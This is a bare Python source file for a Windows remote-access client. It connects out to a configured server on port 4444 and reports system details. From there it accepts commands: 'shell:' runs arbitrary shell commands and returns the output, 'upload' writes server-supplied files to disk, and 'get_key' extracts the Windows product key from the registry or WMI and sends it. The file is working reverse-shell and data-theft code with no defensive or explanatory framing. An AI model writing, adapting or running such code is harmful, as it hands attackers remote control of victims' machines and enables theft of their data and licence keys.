import socket
import os
import platform
import subprocess
import winreg
import wmi

SERVER_IP = "0.0.0.0"
SERVER_PORT = 4444

def decode_key(rpk):
    rpkOffset = 52
    i = 28
    szPossibleChars = "BCDFGHJKMPQRTVWXY2346789"
    szProductKey = ""

    while i >= 0:
        dwAccumulator = 0
        j = 14
        while j >= 0:
            dwAccumulator = dwAccumulator * 256
            d = rpk[j + rpkOffset]
            if isinstance(d, str):
                d = ord(d)
            dwAccumulator = d + dwAccumulator
            rpk[j + rpkOffset] = int(dwAccumulator / 24) if int(dwAccumulator / 24) <= 255 else 255
            dwAccumulator = dwAccumulator % 24
            j = j - 1
        i = i - 1
        szProductKey = szPossibleChars[dwAccumulator] + szProductKey

        if ((29 - i) % 6) == 0 and i != -1:
            i = i - 1
            szProductKey = "-" + szProductKey
    return szProductKey


def get_key_from_reg_location(key, value='DigitalProductID'):
    arch_keys = [0, winreg.KEY_WOW64_32KEY, winreg.KEY_WOW64_64KEY]
    for arch in arch_keys:
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_READ | arch)
            value, _ = winreg.QueryValueEx(reg_key, value)
            return decode_key(list(value))
        except (FileNotFoundError, TypeError):
            pass
    return None


def get_windows_product_key_from_reg():
    return get_key_from_reg_location(r'SOFTWARE\Microsoft\Windows NT\CurrentVersion')


def get_windows_product_key_from_wmi():
    w = wmi.WMI()
    try:
        product_key = w.softwarelicensingservice()[0].OA3xOriginalProductKey
        if product_key != '':
            return product_key
        else:
            return None
    except AttributeError:
        return None


def get_windows_key():
    # Try WMI first, fallback to registry
    wmi_key = get_windows_product_key_from_wmi()
    if wmi_key:
        return wmi_key
    return get_windows_product_key_from_reg()


def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_IP, SERVER_PORT))
    os_info = f"{platform.system()} {platform.release()} {platform.version()} ({platform.architecture()[0]})"
    client.send(os_info.encode())

    while True:
        try:
            command = client.recv(1024).decode()
            if command == "kill":
                break
            elif command == "upload":
                filename = client.recv(1024).decode()
                file_content = client.recv(4096)
                with open(filename, "wb") as f:
                    f.write(file_content)
            elif command == "get_key":
                windows_key = get_windows_key()
                client.send(windows_key.encode())
            elif command.startswith("shell:"):
                cmd = command.split("shell:")[1]
                result = subprocess.getoutput(cmd)
                client.send(result.encode())
        except:
            break

    client.close()


if __name__ == "__main__":
    main()
